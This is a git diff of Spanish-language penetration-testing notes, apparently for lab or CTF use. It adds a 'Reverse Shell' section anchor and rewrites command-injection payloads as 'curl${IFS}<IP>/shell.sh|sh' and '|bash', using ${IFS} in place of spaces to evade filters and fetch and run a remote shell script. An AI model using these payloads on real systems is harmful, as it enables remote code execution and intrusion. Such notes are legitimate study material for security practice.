@@ -5,6 +5,7 @@
 - [HTTP SSL](#exssl)
 - [Wordpress](#exwp)
 - [Reverse Shell](#shell)
+- [Experiencias con Reverse Shell](#exshell)
 - [Inyeccion comandos](#inyeccion_comandos)
  <a name="exftp"></a>
 ### FTP
@@ -79,7 +80,7 @@ Credenciales por fuerza bruta abusando de xmlrpc
 
 
  <a name="inyeccion_comandos"></a>
-
+ <a name="exshell"></a>
 ### Experiencias con Reverse Shell  
 
 #### Si no deja introducir espacios en blanco, lo mejor es: 
@@ -93,9 +94,11 @@ python3 -m http.server 80
 ```
 3º En la parte donde podamos inyectar el comando:
 ```
-curl <IP>/shell.sh|sh
+curl${IFS}<IP>/shell.sh|sh
 o
-curl <IP>/shell.sh|bash
+curl${IFS}<IP>/shell.sh|bash
+
+${IFS} sería el espacio en bash
 ```
 ### Inyección de comandos WEB  
 
